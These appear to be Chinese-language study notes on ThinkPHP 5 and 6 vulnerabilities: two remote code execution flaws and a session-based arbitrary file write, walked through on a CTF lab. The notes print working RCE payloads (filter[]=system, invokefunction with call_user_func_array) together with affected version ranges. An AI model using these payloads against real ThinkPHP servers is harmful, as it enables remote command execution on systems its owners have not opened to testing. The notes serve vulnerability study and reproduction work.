---
title: 
categories:
- Network_Security
- Web
- Framework
tags:
- Network_Security
- Web
- Framework
---

# ThinkPHP 相关漏洞浅略学习

1. 目前学习的主要思路就是大概了解漏洞原理，不过于深入代码，记录复现时的一些问题和经验。

2. 主要参考文章：

    > https://www.cnblogs.com/nongchaoer/p/12029478.html
    > https://blog.csdn.net/qq_39495209/article/details/107864262
    > https://blog.csdn.net/qq_39495209/article/details/107486928
    > https://www.cnblogs.com/lingzhisec/p/15728886.html
    > https://hyasin.github.io/2020/09/08/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/

3. 环境搭建的注意事项：

    1. 使用 composer 创建项目时，指定默认的 tp 版本都是最新版，更改版本的方式就是在创建的项目下执行：
        `composer require topthink/framework 5.x.x`
    2. 注意下载对应的 captcha 版本。

## 1. ThinkPHP 5 相关漏洞

### 1.1 ThinkPHP5 RCE - 核心类 Request 其中变量被覆盖导致 RCE

1. 漏洞原理大概就是 `Request` 类的 `_method` 变量用户可控，传入魔术方法 `__construct`（构造函数）后被执行，后面的参数用于指定恶意方法。
    变量 `s` 应该是 PATH_INFO 模式下的**路由**参数。
    ![image-20240425201132747](ThinkPHP/image-20240425201132747.png)

2. 对于版本小于 5.0.13 的，其 PoC 如下：

    ```html
    POST ?s=index HTTP/1.1
    ...
    _method=__construct&filter[]=system&method=GET&get[]=whoami
    ```

3. 对于版本 >= 5.0.13 且 <= 5.0.23 的，其需要开启 debug，5.0.10 后 debug 自动关闭。
    debug 的开启在 `application - config.php`：
    ![image-20240425155915988](ThinkPHP/image-20240425155915988.png)
    其余不变。
    特殊情况就是，如果存在 captcha 模块和对应的 captcha 路由时，可以不需要开启 debug，此时的 PoC 就是：

    ```html
    POST ?s=captcha HTTP/1.1
    ...
    _method=__construct&filter[]=system&method=GET&get[]=whoami
    ```

4. 对于版本 <= 5.1.2，执行 PoC 时会报错，指出 Env 相关错误。同时 5.1 版本默认 debug 模式也是**关闭**的。经过测试，这种 PoC 的版本最多到 5.1.7，即 5.1.3 <= Version <= 5.1.7。

### 1.2 ThinkPHP5 RCE - 路由控制不严谨导致可以调用任意类致使 RCE

1. 漏洞成因大概是：ThinkPHP 默认没有开启**强制路由**，而且默认开启**路由兼容模式**。那么我们可以用兼容模式来调用控制器 Controller，当没有对控制器过滤时，我们可以调用任意的方法来执行。所有用户参数都会经过 `Request` 类的 `input` 方法处理，该方法会调用 `filterValue` 方法，而 `filterValue` 方法中使用了 `call_user_func` ，尝试利用这个方法来执行命令。

2. 版本 <= 5.0.22 时存在漏洞，版本 <= 5.1.30 时也存在，以后的版本采用正则匹配校验，因此漏洞修复，常见的 PoC 如下：
    ```html
    5.0.x
    ?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=calc
    5.1.x
    ?s=index/think\Request/input&filter[]=system&data=calc
    ?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=calc
    ```

3. todo：5.0.24 存在序列化口时存在反序列化利用。

## 2. ThinkPHP6 相关漏洞

### 2.1 ThinkPHP6 任意文件写入

1. 漏洞版本：`6.0.0 <= ThinkPHP_Version <= 6.0.1`。

2. 现象：Session 可控，Session 的内容如果是文件名的话会在 `项目名/runtime/session` 文件夹下创建  `sess_...` 的文件。

3. 靶场：[GYCTF2020]EasyThinking

4. 拿到源码后，寻找能够修改 Session 的地方：
    ```php
    public function search()
    {
        if (Request::isPost()){
            # session() 方法会进行 session 内容的比较
            if (!session('?UID'))
            {
                return redirect('/home/member/login');            
            }
            $data = input("post.");
            $record = session("Record");
            if (!session("Record"))
            {
                session("Record",$data["key"]);
            }
            else
            {
                $recordArr = explode(",",$record);
                $recordLen = sizeof($recordArr);
                if ($recordLen >= 3){
                    array_shift($recordArr);
                    session("Record",implode(",",$recordArr) . "," . $data["key"]);
                    return View::fetch("result",["res" => "There's nothing here"]);
                }
            }
            # 可以知道 session 来源于变量 $data
            session("Record",$record . "," . $data["key"]);
            return View::fetch("result",["res" => "There's nothing here"]);
        }else{
            return View("search");
        }
    }
    ```

    源码分析后，发现其 session 来自 `$data` 且要符合内容。

5. 往上追溯 `$data` 的初次赋值，可以看到来自注册界面：
    ```php
    public function register()
    {
        if (Request::isPost()){
            # 这里使用了 "post."，导致其会将请求包中的所有参数接收并存入数据库。这里就是 Session 设置的关键。
            $data = input("post.");
            if (!(new Auth)->validRegister($data)){
                return "<script>alert(\"当前用户名已注册\");history.go(-1)</script>";
            }
            $data["password"] = md5($data["password"]);
            $data["status"] = 0;
            $res = User::create($data);
            if ($res){
                return redirect('/home/member/login');
            }
            return "<script>alert(\"注册失败\");history.go(-1)</script>";
        }else{
            return View("register");
        }
    }
    ```

    这里给出 `Input()` 的源代码：
    ```php
    (!function_exists('input')) {
        /**
         * 获取输入数据 支持默认值和过滤
         * @param string $key     获取的变量名
         * @param mixed  $default 默认值
         * @param string $filter  过滤方法
         * @return mixed
         */
        function input(string $key = '', $default = null, $filter = '')
        {
            if (0 === strpos($key, '?')) {
                $key = substr($key, 1);
                $has = true;
            }
    
            if ($pos = strpos($key, '.')) {
                // 指定参数来源
                $method = substr($key, 0, $pos);
                if (in_array($method, ['get', 'post', 'put', 'patch', 'delete', 'route', 'param', 'request', 'session', 'cookie', 'server', 'env', 'path', 'file'])) {
                    $key = substr($key, $pos + 1);
                    if ('server' == $method && is_null($default)) {
                        $default = '';
                    }
                } else {
                    $method = 'param';
                }
            } else {
                // 默认为自动判断
                $method = 'param';
            }
    
            return isset($has) ?
            request()->has($key, $method) :
            request()->$method($key, $default, $filter);
        }
    ```

6. PHP 官方默认设定的 Session 长度为 32 位：

    > https://www.php.net/manual/zh/session.configuration.php#ini.session.sid-length

    所以设置 Session 为文件名时，带上后缀长度也要满足 32 位。

7. 具体解题过程详见：

    > https://fanygit.github.io/2021/10/20/[GYCTF2020]EasyThinking%201/

    这样有些步骤就解释的通了。